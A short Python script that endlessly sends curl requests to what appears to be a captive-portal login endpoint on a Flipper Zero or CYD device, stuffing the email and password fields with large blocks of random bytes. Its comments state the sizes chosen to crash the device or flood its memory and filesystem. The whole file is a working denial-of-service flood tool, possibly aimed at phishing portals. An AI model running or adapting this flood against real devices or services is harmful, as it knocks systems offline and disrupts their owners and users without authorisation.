import subprocess
import os
# from requests.utils import requote_uri
import urllib.parse
from random import randbytes

# host = "http://192.168.4.1" # cyd version
host = "http://172.0.0.1" # flipper version
# host = "http://10.0.0.80"
# rangei = 10000
# charlen = 2012 # to crash
charlen = 1400 # to flood flipper mem(?)
# charlen = 700 # to flood filesysted
curl_cmd = "curl --include --silent --show-error"

x = 0
#for x in range(rangei+1):
while True:
	payload = urllib.parse.quote(randbytes(charlen))	
	uri = f"{host}/get?email={payload}&password={payload}"
	command = f"{curl_cmd} '{uri}'"

	print(f"{x} of infinite sets of {charlen} random bytes")
	p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
	(output, err) = p.communicate()
	p_status = p.wait()
	x=x+1

print(f"\n\nThe End")
